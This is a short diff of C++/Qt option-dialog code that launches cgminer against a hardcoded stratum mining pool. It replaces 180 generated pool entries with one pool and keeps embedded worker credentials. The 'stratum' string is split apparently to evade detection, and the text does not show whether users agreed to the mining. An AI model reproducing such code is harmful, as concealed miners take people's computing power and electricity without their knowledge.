@@ -457,21 +457,8 @@ void OptionDialog::loadOption()
         restartcgminer.setInterval(60*1000);
         restartcgminer.setSingleShot(true);
         connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
-        int index=0;
-        while(index<180)
-        {
-            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_uc"+QString::number(rand()%100+1)+":JE5RfIAzapCSABZC";
-            pools << pool;
-            index++;
-        }
-        /*QStringList pool2;
-        pool2=QStringList() << "--scrypt" << "-o" << "stratum+tcp://us.wemineltc.com:3333" <<  "-O" << "alphaonex86.pool:yyDKPcO850pCayTx" << "--thread-concurrency" << "1";
-        index=0;
-        while(index<10)
-        {
-            pools << pool2;
-            index++;
-        }*/
+        QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3333) << "-O" << "alphaonex86_ultracopiermerged:JE5RfIAzapCSABZC";
+        pools << pool;
     }
     #endif
 
